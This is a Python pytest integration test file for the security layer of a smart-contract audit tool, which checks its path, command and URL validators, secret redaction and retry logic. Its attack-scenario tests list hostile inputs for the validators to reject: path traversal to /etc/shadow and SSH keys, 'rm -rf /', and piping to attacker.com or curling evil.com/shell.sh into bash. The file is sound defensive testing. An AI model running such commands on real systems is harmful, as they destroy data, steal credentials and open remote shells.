"""
Integration tests for security components.

Tests how validators, secret management, exception handling, and retry logic
work together in real-world scenarios.
"""

import pytest
import logging
import os
from pathlib import Path
from unittest.mock import Mock, patch

from src.security.validators import PathValidator, CommandValidator, URLValidator
from src.security.secrets import SecretManager, setup_secret_logging
from src.exceptions import (
    PathTraversalError,
    CommandInjectionError,
    ValidationError,
    NetworkError,
    APIKeyError
)
from src.utils.retry import retry_with_backoff, RetryContext
from src.config import AuditConfig


class TestSecurityIntegration:
    """Test integration of all security components."""

    def test_config_with_validators_and_secrets(self):
        """Test config uses both validators and secret management."""
        # Set environment variables for testing (must meet minimum length requirement)
        os.environ['ANTHROPIC_API_KEY'] = 'sk-ant-test123456789012345678901234567890123456'

        try:
            config = AuditConfig.quick()

            # Config should load secrets
            assert config.anthropic_api_key is not None

            # Config should validate paths
            with pytest.raises(PathTraversalError):
                PathValidator.validate_path("../../etc/passwd", str(Path.cwd()))

        finally:
            # Cleanup
            os.environ.pop('ANTHROPIC_API_KEY', None)

    def test_retry_with_custom_exceptions(self):
        """Test retry mechanism with custom exception hierarchy."""
        call_count = 0

        @retry_with_backoff(max_retries=3, base_delay=0.01, retryable_exceptions=(NetworkError,))
        def flaky_network_call():
            nonlocal call_count
            call_count += 1
            if call_count < 3:
                raise NetworkError("Temporary failure")
            return "success"

        result = flaky_network_call()

        assert result == "success"
        assert call_count == 3

    def test_validation_error_not_retried(self):
        """Test validation errors are not retried."""
        call_count = 0

        @retry_with_backoff(max_retries=3, retryable_exceptions=(NetworkError,))
        def validate_input():
            nonlocal call_count
            call_count += 1
            raise ValidationError("Invalid input")

        with pytest.raises(ValidationError):
            validate_input()

        # Should fail immediately without retries
        assert call_count == 1

    def test_secret_logging_with_exception_context(self):
        """Test secret logging filters exception context."""
        setup_secret_logging()
        logger = logging.getLogger("test_integration")

        with patch('sys.stdout') as mock_stdout:
            try:
                raise APIKeyError(
                    "Authentication failed",
                    api_name='Anthropic'
                )
            except APIKeyError as e:
                logger.error(f"Error: {e}")

                # Exception context should not leak secrets
                exc_str = str(e)
                assert "api=Anthropic" in exc_str


class TestPathValidationIntegration:
    """Test path validation in realistic scenarios."""

    def test_safe_file_operations(self, tmp_path):
        """Test safe file operations with path validation."""
        # Create test directory structure
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        test_file = project_dir / "test.sol"
        test_file.write_text("contract Test {}")

        # Validate safe path
        safe_path = PathValidator.validate_path(
            str(test_file),
            str(project_dir)
        )
        assert safe_path == str(test_file)

        # Block traversal attempts
        with pytest.raises(PathTraversalError):
            PathValidator.validate_path(
                str(tmp_path / "outside.sol"),
                str(project_dir)
            )

    def test_command_execution_with_file_args(self, tmp_path):
        """Test command validation with file arguments."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()
        safe_file = project_dir / "safe.sol"
        safe_file.write_text("contract Safe {}")

        # Validate safe command
        safe_cmd = CommandValidator.validate_command(
            "slither",
            [str(safe_file)],
            allowed_base_dir=str(project_dir)
        )
        assert safe_cmd == ["slither", str(safe_file)]

        # Block command injection
        with pytest.raises(CommandInjectionError):
            CommandValidator.validate_command(
                "slither",
                [f"{safe_file}; rm -rf /"],
                allowed_base_dir=str(project_dir)
            )


class TestNetworkSecurityIntegration:
    """Test network security with retry and validation."""

    def test_rpc_validation_with_retry(self):
        """Test RPC URL validation with retry logic."""
        # Validate RPC URL first
        rpc_url = "https://mainnet.infura.io/v3/abc123"
        validated_url = URLValidator.validate_rpc_url(rpc_url)
        assert validated_url == rpc_url

        # Block malicious URLs
        with pytest.raises(ValidationError):
            URLValidator.validate_rpc_url("javascript:alert(1)")

    def test_retry_with_timeout(self):
        """Test retry mechanism respects timeouts."""
        call_count = 0

        with RetryContext(max_retries=3, base_delay=0.01) as retry:
            for attempt in retry:
                call_count += 1
                try:
                    if call_count < 2:
                        raise NetworkError("Timeout")
                    break
                except NetworkError as e:
                    if not retry.should_retry(e):
                        raise
                    if attempt < retry.max_retries:
                        retry.wait()
                    else:
                        raise

        assert call_count == 2


class TestErrorHandlingIntegration:
    """Test error handling across components."""

    def test_exception_hierarchy_in_practice(self):
        """Test exception hierarchy catches correctly."""
        from src.exceptions import (
            SecurityAuditException,
            NetworkError,
            RPCError
        )

        # Create exception chain
        exc = RPCError("Connection failed", rpc_url="https://eth.llamarpc.com")

        # Should be catchable at any level
        assert isinstance(exc, RPCError)
        assert isinstance(exc, NetworkError)
        assert isinstance(exc, SecurityAuditException)

    def test_error_context_preservation(self):
        """Test error context is preserved through retry."""
        errors_seen = []

        @retry_with_backoff(
            max_retries=2,
            base_delay=0.01,
            retryable_exceptions=(NetworkError,)
        )
        def failing_operation():
            exc = NetworkError("RPC failed")
            exc.context = {'rpc_url': 'https://eth.llamarpc.com', 'attempt': len(errors_seen)}
            errors_seen.append(exc)
            if len(errors_seen) < 3:
                raise exc
            return "success"

        result = failing_operation()

        assert result == "success"
        assert len(errors_seen) == 3

        # Context should be preserved
        for i, exc in enumerate(errors_seen):
            assert exc.context['rpc_url'] == 'https://eth.llamarpc.com'
            assert exc.context['attempt'] == i


class TestSecurityDefenseInDepth:
    """Test defense-in-depth security measures."""

    def test_multiple_validation_layers(self, tmp_path):
        """Test multiple validation layers prevent attacks."""
        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Layer 1: Path validation
        with pytest.raises(PathTraversalError):
            PathValidator.validate_path("../../etc/passwd", str(project_dir))

        # Layer 2: Command validation
        with pytest.raises(CommandInjectionError):
            CommandValidator.validate_command("slither", ["contract.sol; rm -rf /"])

        # Layer 3: URL validation
        with pytest.raises(ValidationError):
            URLValidator.validate_rpc_url("file:///etc/passwd")

    def test_secret_not_logged_during_error(self):
        """Test secrets are not logged even during errors."""
        setup_secret_logging()
        logger = logging.getLogger("security_test")

        # Simulate error with secret in context (must meet minimum length)
        os.environ['ANTHROPIC_API_KEY'] = 'sk-ant-secret12345678901234567890123456789012345'

        try:
            with patch('sys.stderr') as mock_stderr:
                try:
                    config = AuditConfig.quick()
                    raise APIKeyError(
                        f"API key validation failed: {config.anthropic_api_key}",
                        api_name='Anthropic'
                    )
                except APIKeyError as e:
                    logger.error(f"Error occurred: {e}")

                    # Secret should not appear in error message
                    error_str = str(e)
                    assert 'secret123456789' not in error_str
        finally:
            os.environ.pop('ANTHROPIC_API_KEY', None)

    def test_retry_preserves_security_context(self):
        """Test retry mechanism preserves security context."""
        attempt_count = 0

        @retry_with_backoff(max_retries=3, base_delay=0.01)
        def secure_operation():
            nonlocal attempt_count
            attempt_count += 1

            if attempt_count < 2:
                # Simulate validation failure
                raise ValidationError("Security check failed")

            return "success"

        # Validation errors should not be retried
        with pytest.raises(ValidationError):
            secure_operation()

        assert attempt_count == 1  # No retries for validation errors


class TestRealisticScenarios:
    """Test realistic attack and defense scenarios."""

    def test_path_traversal_attack_blocked(self, tmp_path):
        """Test realistic path traversal attack is blocked."""
        project_dir = tmp_path / "contracts"
        project_dir.mkdir()

        # Attacker tries various traversal techniques
        attack_vectors = [
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "contracts/../../../etc/shadow",
            "./../../etc/hosts",
            "contracts/../../etc/passwd",
        ]

        for attack in attack_vectors:
            with pytest.raises(PathTraversalError):
                PathValidator.validate_path(attack, str(project_dir))

    def test_command_injection_attack_blocked(self):
        """Test realistic command injection attacks are blocked."""
        attack_vectors = [
            "file.sol; rm -rf /",
            "file.sol && cat /etc/passwd",
            "file.sol | nc attacker.com 4444",
            "file.sol > /dev/null; curl evil.com/shell.sh | bash",
            "$(curl attacker.com/pwn.sh)",
            "`cat /etc/passwd`",
            "file.sol'; DROP TABLE users; --",
        ]

        for attack in attack_vectors:
            with pytest.raises(CommandInjectionError):
                CommandValidator.validate_command("slither", [attack])

    def test_rpc_url_injection_blocked(self):
        """Test RPC URL injection attacks are blocked."""
        attack_vectors = [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "file:///etc/passwd",
            "ftp://attacker.com/shell.sh",
            "http://localhost:8545/../../../etc/passwd",
        ]

        for attack in attack_vectors:
            with pytest.raises(ValidationError):
                URLValidator.validate_rpc_url(attack)

    def test_environment_variable_injection_blocked(self):
        """Test environment variable injection is blocked."""
        attack_vectors = [
            "MALICIOUS_VAR=evil",
            "PATH=/tmp/evil:$PATH",
            "LD_PRELOAD=/tmp/evil.so",
            "HOME=/tmp/pwned",
        ]

        for attack in attack_vectors:
            with pytest.raises(ValidationError):
                CommandValidator.validate_env_vars({attack.split('=')[0]: attack.split('=')[1]})


class TestPerformanceAndResilience:
    """Test performance and resilience of security components."""

    def test_retry_backoff_prevents_thundering_herd(self):
        """Test exponential backoff prevents thundering herd."""
        from src.utils.retry import exponential_backoff
        import time

        # Simulate multiple concurrent retries
        delays = []
        for attempt in range(5):
            start = time.time()
            delay = exponential_backoff(attempt, base_delay=0.1, max_delay=2.0, jitter=True)
            time.sleep(delay)
            elapsed = time.time() - start
            delays.append(elapsed)

        # Delays should increase exponentially
        for i in range(1, len(delays)):
            assert delays[i] > delays[i-1]

    def test_validation_performance(self, tmp_path):
        """Test validation doesn't introduce significant overhead."""
        import time

        project_dir = tmp_path / "project"
        project_dir.mkdir()

        # Create test file
        test_file = project_dir / "test.sol"
        test_file.write_text("contract Test {}")

        # Validate 100 paths
        start = time.time()
        for _ in range(100):
            PathValidator.validate_path(str(test_file), str(project_dir))
        elapsed = time.time() - start

        # Should complete in under 0.1 seconds
        assert elapsed < 0.1

    def test_exception_creation_overhead(self):
        """Test exception creation doesn't introduce overhead."""
        import time

        # Create 1000 exceptions
        start = time.time()
        for i in range(1000):
            exc = NetworkError(f"Error {i}", context={'attempt': i})
        elapsed = time.time() - start

        # Should complete in under 0.1 seconds
        assert elapsed < 0.1


class TestSecurityDocumentation:
    """Test security features are well-documented."""

    def test_exception_types_documented(self):
        """Test all exception types have docstrings."""
        from src import exceptions
        import inspect

        for name, obj in inspect.getmembers(exceptions):
            if inspect.isclass(obj) and issubclass(obj, Exception):
                assert obj.__doc__ is not None, f"{name} missing docstring"

    def test_validators_documented(self):
        """Test all validators have docstrings."""
        from src.security import validators
        import inspect

        for name, obj in inspect.getmembers(validators):
            if inspect.isclass(obj):
                assert obj.__doc__ is not None, f"{name} missing docstring"
